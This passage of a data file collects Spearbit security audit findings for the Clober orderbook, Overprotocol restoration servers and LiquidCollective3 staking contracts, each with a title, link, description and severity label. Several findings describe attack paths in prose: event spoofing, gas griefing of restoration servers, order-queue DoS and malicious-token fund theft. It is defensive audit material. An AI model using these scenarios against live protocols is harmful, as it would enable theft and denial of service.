"Market orders in Orderbook.marketOrder set the 8-th bit of options. This options value is later used in _take's TakeOrder event. However, one can call Orderbook.limitOrder with this 8-th bit set and spoof a market order event.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "_priceToIndex will revert if price is type(uint128).max", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Because price is type uint128, the increment will overflow first before it is casted to uint256 uint256 shiftedPrice = uint256(price + 1) << 64;", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "using block.chainid for create2 salt can be problematic if there's chain hardfork", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Using block.chainid as salt for create2 can result in inconsistency if there is a chain split event(eg. eth2 merge). This will make 2 different chains that has different chainid(one with original chain id and one with random new value). Which will result in making one of the chains not able to interact with markets, nfts properly. Also, it will make things hard to do a fork testing which changes chainid for local environment.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "Use get64Unsafe() when updating claimable in take()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "get64Unsafe() can be used when fetching the stored claimable value since _getClaimableIndex() returns elementIndex < 4", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Check is zero is cheaper than check if the result is a concrete value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Checking if the result is zero vs. checking if the result is/isn't a concrete value should save 1 opcode.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Function argument can be skipped", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The address caller parameter in the internal _cancel function can be replaced with msg.sender as effectively this is the value that is actually used when the function is invoked.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Redundant flash loan balance cap", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The requested flash loan amounts are checked against and capped up to the contract's token bal- ances, so the caller has to validate and handle the case where the tokens received are below the requested amounts. It would be better to optimize for the success case where there are sufficient tokens. Otherwise, let the function revert from failure to transfer the requested tokens instead.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Do direct assignment to totalBaseAmount and totalQuoteAmount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "While iterating through multiple claims, totalBaseAmount and totalQuoteAmount are reset and as- signed a value each iteration. Since they are only incremented in the referenced block (and are mutually exclusive cases), the assignment can be direct instead of doing an increment.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Redundant zero minusFee setter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "minusFee defaults to zero, so the explicit setting of it is redundant.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Load _FEE_PRECISION into local variable before usage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Loading _FEE_PRECISION into a local variable slightly reduced bytecode size (0.017kB) and was found to be a tad more gas efficient.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Can cache value difference in SegmentedSegmentTree464.update", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The replaced - value expression in SegmentedSegmentTree464.pop is recomputed several times in each loop iteration.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Unnecessary loop condition in pop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The loop variable l in SegmentedSegmentTree464.pop is an unsigned int, so the loop condition l >= 0 is always true. The reason why it still terminates is that the first layer only has group index 0 and 1, so the rightIndex.group - leftIndex.group < 4 condition is always true when the first layer is reached, and then it terminates with the break keyword.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Use same comparisons for children in heap", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The pop function compares one child with a strict inequality (<) and the other with less than or equals (<=). A heap doesn't guarantee order between the children and there are no duplicate nodes (wordIndexes).", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "No need for explicit assignment with default values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Explicitly assigning ZERO value (or any default value) costs gas, but is not needed.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Prefix increment is more efficient than postfix increment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The prefix increment reduces bytecode size by a little, and is slightly more gas efficient.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Tree update can be avoided for fully filled orders", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "For fully filled orders, remainingAmount will be 0 (openOrderAmount == claimedRawAmount), so the tree update can be skipped since the new value is the same as the old value. Hence, the code block can be moved inside the if (remainingAmount > 0) code block.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Shift msg.value cap check for earlier revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The cap check on msg.value should be shifted up to the top of the function so that failed checks will revert earlier, saving gas in these cases.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Solmate's ReentrancyGuard is more efficient than OpenZeppelin's", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Solmate's ReentrancyGuard provides the same functionality as OpenZeppelin's version, but is more efficient as it reduces the bytecode size by 0.11kB, which can be further reduced if its require statement is modified to revert with a custom error.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "r * r is more gas efficient than r ** 2", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "It's more gas efficient to do r * r instead of r ** 2, saving on deployment cost.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Update childHeapIndex and shifter initial values to constants", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The initial values of childHeapIndex and shifter can be better hardcoded to avoid redundant operations.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Same value tree update falls under else case which will do redundant overflow check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "In the case where value and replaced are equal, it currently will fall under the else case which has an addition overflow check that isn't required in this scenario. In fact, the tree does not need to be updated at all.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Unchecked code blocks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The mentioned code blocks can be performed without native math overflow / underflow checks because they have been checked to be so, or the min / max range ensures it.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Unused Custom Error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "error TreeQueryIndexOrder(); is defined but unused.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Markets with malicious tokens should not be interacted with", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The Clober protocol is permissionless and allows anyone to create an orderbook for any base token. These base tokens can be malicious and interacting with these markets can lead to loss of funds in several ways. For example, a token with custom code / a callback to an arbitrary address on transfer can use the pending ETH that the victim supplied to the router and trade it for another coin. The victim will lose their ETH and then be charged a second time using their WETH approval of the router.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Claim bounty of stale orders should be given to user instead of daoTreasury", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "When an unclaimed stale order is being replaced, the claimBounty is sent to the DAO treasury. However, since the user is the one executing the claim on behalf of the stale order owner, and is paying the gas for it, the claimBounty should be sent to him instead.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Misleading comment on remainingRequestedRawAmount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The comment says // always ceil, but remainingRequestedRawAmount is rounded down when the base / quote amounts are converted to the raw amount.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Potential DoS if quoteUnit and index to price functions are set to unreasonable values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "There are some griefing and DoS (denial-of-service) attacks for some markets that are created with bad quoteUnit and pricing functions. 1. A market order uses _take to iterate over several price indices until the order is filled. An attacker can add a tiny amount of depth to many indices (prices), increasing the gas cost and in the worst case leading to out-of-gas transactions. 2. There can only be MAX_ORDER_SIZE (32768) different orders at a single price (index). Old orders are only replaced if the previous order at the index has been fully filled. A griefer or a market maker trying to block their competition can fill the entire order queue for a price. This requires 32768 * quoteUnit quote tokens.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Rounding rationale could be better clarified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The rationale for rounding up / down was easier to follow if tied to the expendInput option instead.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Rename flashLoan() for better composability & ease of integration", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "For ease of 3rd party integration, consider renaming to flash(), as it would then have the same function sig as Uniswap V3, although the callback function would still be different.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Unsupported tokens: tokens with more than 18 decimals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The orderbook does currently not support tokens with more than 18 decimals. However, having more than 18 decimals is very unusual.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "ArithmeticPriceBook and GeometricPriceBook contracts should be abstract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The ArithmeticPriceBook and GeometricPriceBook contracts don't have any external functions.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "childRawIndex in OctopusHeap.pop is not a raw index", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The OctopusHeap uses raw and heap indices. Raw indices are 0-based (root has raw index 0) and iterate the tree top to bottom, left to right. Heap indices are 1-based (root has heap index 0) and iterate the head left to right, top to bottom, but then iterate the remaining nodes octopus arm by arm. A mapping between the raw index and heap index can be obtained through _convertRawIndexToHeapIndex. The pop function defines a childRawIndex but this variable is not a raw index, it's actually raw index + 1 (1-based). 30", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Lack of orderIndex validation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The orderIndex parameter in the OrderNFT contract is missing proper validation. Realistically the value should never exceed type(uint232).max as it is passed from the OrderBook contract, however, future changes to the code might potentially cause encoding/decoding ambiguity.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Unsafe _getParentHeapIndex, _getLeftChildHeapIndex", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "When heapIndex = 1 _getParentHeapIndex(uint16 heapIndex) would return 0 which is an invalid heap index. when heapIndex = 45 _getLeftChildHeapIndex(uint16 heapIndex) would return 62 which is an invalid heap index.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "_priceToIndex function implemented but unused", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The _priceToIndex function for the price books are implemented but unused.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Incorrect _MAX_NODES and _MAX_NODES_P descriptions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The derivation of the values _MAX_NODES and MAX_NODES_P in the comments are incorrect. For _MAX_NODES C * ((S *C) ** L-1)) = 4 * ((2 * 4) ** 3) = 2048 is missing the E, or replace S * C with N. The issue isn't entirely resolved though, as it becomes C * (S * C * E) ** (L - 1) = 4 * (2 * 4 * 2) ** 3 = 16384 or 2 ** 14 Same with _MAX_NODES_P", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "marketOrder() with expendOutput reverts with SlippageError with max tolerance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "During the audit the Clober team raised this issue. Added here to track the fixes.", "labels": ["Spearbit", "Clober", "Severity: High Risk"]}, {"title": "Wrong OrderIndex could be emitted at Claim() event.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "During the audit the Clober team raised this issue. Added here to track the fixes.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "A malicious entity can grieve Restoration Servers for their funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf", "body": "Due to the location of the CanTransfer() check in (evm *EVM) Restore() it is possible for a ma- licious entity to grieve honest restoration servers for significant amount of gas. This can become a more serious issue if a large portion of restoration servers run out of gas and their accounts expire before owners realize. A competing restoration server may want to do this to harm its competition. An example attack could be a malicious actor creating a large number of accounts (100+) and seeding them all with 10 OVER. It would then need to let some time pass and the accounts go dormant (the longer the accounts are dormant the larger the restoration proof and the more effective this attack will be). The entity then could create its own restoration proofs with the fees costing the entire 10 OVER for each account. This would effectively collect all of the account balances into its own account. It could wait until it either controls a validator that is the proposer for the next block or it can use increased priority fees to make sure that its transactions are placed early in the next block. It can send all of its own restorationTX's at the same time that it makes restoration requests to all of other known restoration servers in the network. The remaining honest restoration servers will query their local nodes that will not have their state updated yet with the malicious entity's self created restorationTX's. All checks will pass including checkFeePayable() which will see 10 OVER in each account. The honest restoration servers will all create and submit restorationTX's for the 100+ accounts. By the time they are processed by the EVM the malicious entities restorationTX's will have already processed and the victim restoration servers' restorationTX's will fail at the requestors balance check in (evm *EVM) Restore(). When this happens all of the honest restoration servers' gas will be consumed: // The sender of the restore data has to have enough balance to send the restoration fee if restoreData.FeeRecipient != nil && restoreData.Fee.Sign() != 0 { if !evm.Context.CanTransfer(evm.StateDB, sender, restoreData.Fee) { err = ErrInsufficientBalance } else { evm.Context.Transfer(evm.StateDB, sender, *restoreData.FeeRecipient, restoreData.Fee) } } if err != nil { evm.StateDB.RevertToSnapshot(snapshot) if err != ErrExecutionReverted { gas = 0 } } The result of this attack is that the restoration servers will have their gas funds burned without being able to recoup the fees require to cover their loss. It its current form the max gas that can be grieved is only limited by the base fee and and the size of the proof (length of time the account has been dormant). Using hundreds or thousands of accounts requiring large proofs can enable an attacker to trick honest restoration servers from burn all of their balances in gas.", "labels": ["Spearbit", "Overprotocol", "Severity: Critical Risk"]}, {"title": "Precisely timed malicious restoration requests can grieve restoration servers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf", "body": "In order to execute a restoration transaction, the restoreDataSigner.Sender account that signed and sent the restoreData request must have sufficient balance to cover the fee. However, there is no check to make sure that the restoreDataSigner.Sender account actually exists in the current state. If that account has been expired from the state, the transaction will fail upon checking CanTransfer, and the gas paid by the honest restoration server will be burned without any repercussions to the restoreDataSigner.Sender account. Therefore it is possible to execute a timing attack where the restoreDataSigner.Sender account exists when the restoration server verifies a request but then expires from the state before the restoration transaction gets executed in the EVM. For example, I have an account we'll call \"malicious account\" that has been inactive for 2*SweepEpoch - 1 blocks. This account will expire on the next epoch. In the last slot of that epoch before expiration, the \"malicious account\" will sign and send a valid restoreData request for any expired account to an honest restoration server. The restoration server will generate the valid proof and send a valid restoration transaction for this request. By the time this restoration transaction gets executed in the EVM (which would be in the next slot), the \"malicious account\" will have expired. The \"malicious account\" will not have to pay any fee while costing the restoration server all of the gas of the transaction which could be made to be very large. If this got scaled up similar to a scenario described in the issue \"A malicious entity can grieve OVER network Restoration Servers for their funds\", then this could cause some problems. Though this scenario is similar, the source and trigger of the vulnerability is unique and requires its own solution. It is also a more constrained attack scenario, requiring correct timing on the epoch boundary. But each slot is 12 seconds, and I believe that is plenty of time to execute this with reasonable expectations of success.", "labels": ["Spearbit", "Overprotocol", "Severity: High Risk"]}, {"title": "Ignored returned gas and nonce update in Create*WithUiHash", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf", "body": "If a call to precompiled contracts createContractWithUiHash or create2ContractWithUiHash fails before attempting to deploy the new contract code, the remaining gas returned will all be burned due to checks in evm.Call which that consume all gas on error. There are 6 locations where an error could happen and the call attempts to return gas:  core/vm/evm.go#L621  core/vm/evm.go#L624  core/vm/evm.go#L727  core/vm/evm.go#L734  core/vm/evm.go#L750  core/vm/evm.go#L757 In each of these locations, an error happens and it attempts to return the gas. However, the gas returned here will get consumed anyways due to the fact that that it is a precompile. We can see this gas consumption functions behavior in the function evm.Call at core/vm/evm.go#L259-L263 (as well as in the other call evm.CallCode/evm.DelegateCall/evm.StaticCall). This means that any failures in the call to the precompiled contracts will always consume all gas if the failure is not a REVERT and it fails before attempting to deploy the code. This differs from the CREATE/CREATE2 functionality which would return any leftover gas. there is another In addition to this issue, issue with the snapshotting and reverting happening twice when a REVERT occurs, once in evm.Call at core/vm/evm.go#L260 and once in evm.createWithUi at core/vm/evm.go#L693. This is an issue for two reasons - it doubles the amount of work when reverting, and the evm.Call revert also reverts the updated Nonce at core/vm/evm.go#L737 and the updated access list at core/vm/evm.go#L629.", "labels": ["Spearbit", "Overprotocol", "Severity: Low Risk"]}, {"title": "REVERT will not return remaining gas in Create*WithUiHash", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf", "body": "If a REVERT opcode were executed during contract deployment in a createContractWithUiHash or create2ContractWithUiHash precompile call, the expectation is that the rest of the not-yet-consumed gas will be returned. There is even a special check in evm.createWithUiHash (see core/vm/evm.go#L693-L695) that ensures that the REVERT opcode has the privilege of getting gas back. This is also the behavior of evm.create and evm.Call. However, the createContractWithUiHash and create2ContractWithUiHash precompiles both ignore the returned gas value if there is any error in the evm.CreateWithUiHash and evm.Create2WithUiHash operations. On error, they instead return 0 gas, burning any leftover gas. You can see this behavior at core/vm/contracts.go#L695-L697 and at core/vm/contracts.go#L727-L729. It's not super common to execute a REVERT inside of contract deployment code, but it does happen. Burning all of the gas on REVERT in contract deployment code is unexpected behavior.", "labels": ["Spearbit", "Overprotocol", "Severity: Low Risk"]}, {"title": "Database#Recoverable does not use ckptRoot parameter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf", "body": "The ckptRoot parameter is not used in this function. I'm a little concerned that we might be missing a check here.", "labels": ["Spearbit", "Overprotocol", "Severity: Low Risk"]}, {"title": "Check for empty restoration proof only does nil check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf", "body": "tyRestorationProof, indicates that msg.Data should not be empty, but the check only ensures the field is not nil. This will allow an empty byte slice, []byte{}, though. I think we should disallow this too.", "labels": ["Spearbit", "Overprotocol", "Severity: Low Risk"]}, {"title": "Restoration clients with unknown SourceEpoch cannot restore", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf", "body": "Clients that do now know their correct SourceEpoch will be unable to generate a ResotrationProof and will have to revert to 3rd prty data sources to learn what their correct SourceEpoch should be. This is due to the fact that there is no way for them to request their current EpochCoverage from a restoration server and the error returned when they use the incorrect SourceEpoch does not tell them what the correct epoch is. This goes against the assumption that Over Protocol clients should not need to keep the entire state in order to participate in the network.", "labels": ["Spearbit", "Overprotocol", "Severity: Informational"]}, {"title": "Performance optimization in RestorationTX verification", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf", "body": "In trie.VerifyProof, there is a call to decodeNode. The comments indicate that it isn't fully perfor- mant: // decodeNode parses the RLP encoding of a trie node. It will deep-copy the passed // byte slice for decoding, so it s safe to modify the byte slice afterwards. The- // decode performance of this function is not optimal, but it is suitable for most // scenarios with low performance requirements and hard to determine whether the // byte slice be modified or not.  Since this VerifyProof call is in the evm, I think it qualifies for needing to be performant code. The current It may be worth creating a different usage of VerifyProof does not ever modify the data in the returned slice. VerifyProofUnsafe function that does not use the deepcopy and would instead call decodeNodeUnsafe. This would mean that the input slice and the output slice will end up sharing memory, so modifying one will modify the other. Therefore there would be an expectation that the input slice and the output slice are not modified and are treated as read-only. According the the benchmarks performed in this comment, this will increase the performance of calls to the Veri- fyProof by ~6.6% on average.", "labels": ["Spearbit", "Overprotocol", "Severity: Informational"]}, {"title": "Outdated docstring for BlockChainAPI#GetEpochByNumber", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf", "body": "This function's docstring is for GetHeaderByNumber and GetHeaderByNumber is missing a docstring.", "labels": ["Spearbit", "Overprotocol", "Severity: Informational"]}, {"title": "Inconsistent field ordering for Trie ID structure", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf", "body": "The order of these fields are inconsistent. For example: // StorageTrieID constructs an identifier for storage trie which ... // state and contract specified by the stateRroot and owner. func StorageTrieID(stateRoot common.Hash, epoch uint32, owner common.Owner, root common.Root) *ID { return &ID{ StateRoot: stateRoot, Epoch: Owner: Root: epoch, owner, root, } } 9 and // TrieID constructs an identifier for a standard trie (not a secondary ... // with provided root. It func TrieID(root common.Hash) *ID { s msotly used in tests and some other ...  return &ID{ StateRoot: root, Owner: Root: Epoch: common.Hash{}, root, 0, } }", "labels": ["Spearbit", "Overprotocol", "Severity: Informational"]}, {"title": "Unnecessary read/write locks in BlobPool accessors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf", "body": "In EpochCoverage, Nonce, and Stats we use a read/write lock when we could use a read lock.", "labels": ["Spearbit", "Overprotocol", "Severity: Informational"]}, {"title": "Misleading comment about base fee being burned", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf", "body": "It appears that the base fee is sent to the OverProtocol treasury instead of being burned. The In my opinion, this should be clearly comment says that the base fee is burned, but this isn't technically true. advertised somewhere too.", "labels": ["Spearbit", "Overprotocol", "Severity: Informational"]}, {"title": "Unhandled errors when using abi.NewType", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf", "body": "In createContractWithUiHash#Run and create2ContractWithUiHash#Run, we do not handle the potential errors when using abi.NewType. I wouldn't actually expect these to fail, but I suggest always handling errors.", "labels": ["Spearbit", "Overprotocol", "Severity: Informational"]}, {"title": "New ErrInsufficientFee error is unused", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf", "body": "There's a new error, ErrInsufficientFee, which was used before but isn't anymore.", "labels": ["Spearbit", "Overprotocol", "Severity: Informational"]}, {"title": "Missing nil check for header", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf", "body": "In verifyRestorationProof, when getting the block root hash, we do not check if the header is nil. If for some reason this is nil, it will panic when accessing the Root field. GetHeaderByNumber could theoretically return nil, but I'm pretty sure prior checks in verifyRestorationProof will prevent this. Better to be safe though.", "labels": ["Spearbit", "Overprotocol", "Severity: Informational"]}, {"title": "_pickNextValidatorsToExitFromActiveOperators uses the wrong index to query stopped validator count for operators", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "operators does not necessarily have the same order as the actual OperatorsV2's operators, since the ones that don't have _hasExitableKeys will be skipped (the operator might not be active or all of its funded keys might have been requested to exit). And so when querying the stopped validator counts for (uint256 idx = 0; idx < exitableOperatorCount;) { uint32 currentRequestedExits = operators[idx].requestedExits; uint32 currentStoppedCount = _getStoppedValidatorsCountFromRawArray(stoppedValidators, idx); one should not use the idx in the cached operator's array, but the cached index of this array element, as the indexes of stoppedValidators correspond to the actual stored operator's array in storage. Note that when emitting the UpdatedRequestedValidatorExitsUponStopped event, the correct index has been used.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Critical Risk"]}, {"title": "Oracles' reports votes are not stored in storage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The purpose of Oracle.1.sol is to facilitate the reporting and quorum of oracles. Oracles period- ically add their reports and when consensus is reached the setConsensusLayerData function (which is a critical component of the system) is called. However, there is an issue with the current implementation as ReportVari- ants holds the reports made by oracles but ReportVariants.get() returns a memory array instead of a storage array, therefore resulting in an increase in votes that will not be stored at the end of the transaction and prevent- ing setConsensusLayerData from being called. This is a regression bug that should have been detected by a comprehensive test suite.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Critical Risk"]}, {"title": "User's LsETH might be locked due to out-of-gas error during recursive calls", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Let W0, W1, ...W7 represent the withdrawal events in the withdrawal stack. Let R0, R1, R2 represent the users' redeem requests in the redeem queue. Assume that Alice is the owner of R1. When Alice called the resolveRedeemRequests function against R1, it will resolve to W 1. Next, Alice called the _claimRedeemRequest function with R1 and its corresponding W 1. The _claimRedeemRequest will first process W 1. At the end of the function, it will check if W 1 matches all the amounts of R1. If not, it will call the _claimRedeemRequest function recursively with the same request id (R1) but increment the withdrawal event id (W2 = W1 + 1). The _claimRedeemRequest function recursively calls itself until all the amount of redeem request is \"expended\" or the next withdrawal event does not exist. In the above example, the _claimRedeemRequest will be called 7 times with W1...W7, until all the amount of R1 is \"expended\" (R1.amount == 0) However, if the amount of a redeem request is large (e.g. 1000 LsETH), and this redeem request is satisfied by many small chunks of withdrawal events (e.g. one withdrawal event consists of less than 10 LsETH), then the recursion depth will be large. The function will keep calling itself recursively until an out-of-gas error happens. If this happens, there is no way to claim the redemption request, and the user's LsETH will be locked. In the current implementation, users cannot break the claim into smaller chunks to overcome the gas limit. In the above example, if Alice attempts to break the claim into smaller chunks by first calling the _claimRedeemRequest function with R1 and its corresponding W5, the _isMatch function within it will revert.", "labels": ["Spearbit", "LiquidCollective3", "Severity: High Risk"]}, {"title": "Allowed users can directly transfer their share to RedeemManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "An allowed user can directly transfer its shares to the RedeemManager without requesting a redeem. This would cause the withdrawal stack to grow, since the redeem demand (2) which is calculated based on the RedeemManager's share of LsETH increases. RedeemQueue would be untouched in this case. In case of an accidental mistake by a user, the locked shares can only be retrieved by a protocol update.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Medium Risk"]}, {"title": "Invariants are not enforced for stopped validator counts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "_setStoppedValidatorCounts does not enforce the following invariants:  stoppedValidatorCounts[0] <= DepositedValidatorCount.get()  stoppedValidatorCounts[i] needs to be a non-decreasing function when viewed on a timeline  stoppedValidatorCounts[i] needs to be less than or equal to the funded number of validators for the corresponding operator. Currently, the oracle members can report values that would break these invariants. As a consequence, the oracle members can signal the operators to exit more or fewer validators by manipulating the preExitingBalance value. And activeCount for exiting validators picking algorithm can also be manipulated per operator.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Medium Risk"]}, {"title": "Potential out of gas exceptions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The purpose of _requestExitsBasedOnRedeemDemandAfterRebalancings is to release liquidity for withdrawals made in the RedeemManager contract. The function prioritizes liquidity sources, starting with Balance- ToRedeem and then BalanceToDeposit, before asking validators to exit. However, if the validators are needed to release more liquidity, the function uses pickNextValidatorsToExit to determine which validators to ask to exit. This process can be quite gas-intensive, especially if the number of validators is large. The gas consumption of this function depends on several factors, including exitableOperatorCount, stoppedVal- idators.length, and the rate of decrease of _count. These factors may increase over time, and the msg.sender does not have control over them. The function includes two nested loops that contribute to the overall gas con- sumption, and this can be problematic for certain inputs. For example, if the operators array has no duplications and the difference between values is exactly 1, such as [n, n-1, n-2 ... n-k] where n can be any number and k is a large number equals exitableOperatorCount - 1 and _count is also large, the function can become extremely gas-intensive. The main consequence of such a potential issue is that the function may not release enough liquidity to the RedeemManager contract, resulting in partial fulfillment of redemption requests. Similarly, _pickNextValidatorsToDepositFromActiveOperators is also very gas intensive. If the number of de- sired validators and current operators (including fundable operators) are high enough, depositToConsensusLayer is no longer callable.", "labels": ["Spearbit", 